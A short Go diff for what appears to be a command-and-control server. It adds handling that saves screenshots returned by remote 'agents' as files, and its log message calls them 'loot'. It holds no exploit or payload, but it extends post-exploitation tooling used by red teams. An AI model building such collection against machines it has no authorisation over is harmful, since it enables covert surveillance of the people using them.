@@ -94,6 +94,17 @@ func (tm *TaskManager) SubmitTaskResult(task TaskResult) error {
 		return err
 	}
 
+	if task.Task.Command == "screenshot" {
+		filePath := fmt.Sprintf("%s_screenshot_%s.png", task.Task.AgentId, time.Now().Format("20060102150405"))
+		err := saveScreenshot(task.Output, filePath)
+		if err != nil {
+			logger.Error("error saving screenshot loot", err, "task_id", task.Task.Id)
+			task.Output = "Error saving screenshot, check server logs"
+		} else {
+			task.Output = fmt.Sprintf("Screenshot saved to %s", filePath)
+		}
+	}
+
 	taskResult, err := json.Marshal(task)
 	if err != nil {
 		return err
